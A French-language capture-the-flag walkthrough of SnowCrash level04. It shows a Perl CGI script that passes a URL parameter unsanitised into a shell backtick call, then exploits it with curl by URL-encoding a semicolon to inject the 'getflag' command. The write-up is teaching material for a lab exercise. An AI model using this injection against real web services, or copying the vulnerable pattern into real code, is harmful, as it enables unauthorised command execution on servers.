# Recherche des fichiers disponibles

Avec la commande ls, on remarque le fichier **level04.pl**.

```bash
level04@SnowCrash:~$ ls
level04.pl
```

En examinant le contenu, on comprend que c'est un script perl qui fait tourner un CGI sur un serveur local avec le port 4747.

```bash
level04@SnowCrash:~$ cat level04.pl 
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

On peut donc accéder au serveur avec une URL du style `http://localhost:4747/?x=hello` avec x le paramètre.

```bash
level04@SnowCrash:~$ curl "http://localhost:4747/?x=hello"
hello
```

Mais étant donné que c'est une URL, certains caractères ne sont pas valides, comme l'espace, du coup il faut le remplacer par son code hexadécimal ASCII, préfixé par un %.

```bash
level04@SnowCrash:~$ curl "http://localhost:4747/?x=hello world"
hello
level04@SnowCrash:~$ curl "http://localhost:4747/?x=hello%20world"
hello world
```

Ainsi, on peut injecter une commande en profitant de la syntaxe bash.

`curl "http://localhost:4747/?x=%3Bgetflag"` (%3B = ;)

donnera par substitution : `echo ;getflag 2>&1`
